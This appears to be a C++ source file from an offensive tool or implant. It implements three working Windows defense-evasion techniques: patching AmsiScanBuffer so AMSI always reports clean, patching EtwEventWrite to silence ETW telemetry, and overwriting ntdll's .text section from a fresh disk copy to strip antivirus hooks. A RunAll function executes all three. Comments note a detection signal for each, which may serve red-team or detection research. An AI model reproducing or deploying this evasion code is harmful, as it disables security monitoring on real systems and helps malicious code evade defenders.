#include "Evasion.h"

// Write `patch` bytes at `addr`, temporarily making the page writable.
static bool PatchMem(void* addr, const BYTE* patch, size_t len) {
    DWORD old = 0;
    if (!VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return false;
    memcpy(addr, patch, len);
    VirtualProtect(addr, len, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    return true;
}

// ── AMSI bypass ───────────────────────────────────────────────────────────────
// Patch AmsiScanBuffer to always return E_INVALIDARG (0x80070057).
// The AMSI scan result is then AMSI_RESULT_CLEAN regardless of input.
// Detection signal: memory write to amsi.dll .text section from non-AMSI process.
bool Evasion::PatchAmsi() {
    HMODULE h = LoadLibraryA(S("amsi.dll").c_str());
    if (!h) return false;
    FARPROC fn = GetProcAddress(h, S("AmsiScanBuffer").c_str());
    if (!fn) return false;
    // x64: mov eax, 0x80070057; ret
    const BYTE p[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    return PatchMem((void*)fn, p, sizeof(p));
}

// ── ETW blind ─────────────────────────────────────────────────────────────────
// Patch EtwEventWrite in ntdll.dll with a single `ret`.
// All ETW telemetry events from this process are silently dropped.
// Detection signal: write to ntdll.dll .text from user process; ETW events cease.
bool Evasion::PatchEtw() {
    HMODULE h = GetModuleHandleA(S("ntdll.dll").c_str());
    if (!h) return false;
    FARPROC fn = GetProcAddress(h, S("EtwEventWrite").c_str());
    if (!fn) return false;
    const BYTE p[] = { 0xC3 };  // ret
    return PatchMem((void*)fn, p, sizeof(p));
}

// ── ntdll unhook ──────────────────────────────────────────────────────────────
// AVs inject hooks by overwriting the first ~5 bytes of ntdll exports with a
// JMP to their inspection function.  Re-mapping a clean copy from disk restores
// the original bytes, removing all usermode hooks in one shot.
// Detection signal: SEC_IMAGE mapping of ntdll followed by VirtualProtect +
// WriteProcessMemory-equivalent over its .text section.
bool Evasion::UnhookNtdll() {
    char sysDir[MAX_PATH] = {};
    GetSystemDirectoryA(sysDir, MAX_PATH);
    std::string path = std::string(sysDir) + S("\\ntdll.dll");

    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    // SEC_IMAGE gives us a proper RVA-mapped view (same layout as the loaded module).
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return false;

    LPVOID pFresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pFresh) return false;

    HMODULE hNtdll = GetModuleHandleA(S("ntdll.dll").c_str());

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pFresh;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)pFresh + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    bool ok = false;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        void* dst = (BYTE*)hNtdll + sec->VirtualAddress;
        void* src = (BYTE*)pFresh  + sec->VirtualAddress;
        DWORD old = 0;
        VirtualProtect(dst, sec->Misc.VirtualSize, PAGE_EXECUTE_WRITECOPY, &old);
        memcpy(dst, src, sec->Misc.VirtualSize);
        VirtualProtect(dst, sec->Misc.VirtualSize, old, &old);
        FlushInstructionCache(GetCurrentProcess(), dst, sec->Misc.VirtualSize);
        ok = true;
        break;
    }

    UnmapViewOfFile(pFresh);
    return ok;
}

std::string Evasion::RunAll() {
    std::string r;
    r += "AMSI patch:   " + std::string(PatchAmsi()    ? "ok" : "failed") + "\n";
    r += "ETW blind:    " + std::string(PatchEtw()     ? "ok" : "failed") + "\n";
    r += "ntdll unhook: " + std::string(UnhookNtdll()  ? "ok" : "failed") + "\n";
    return r;
}
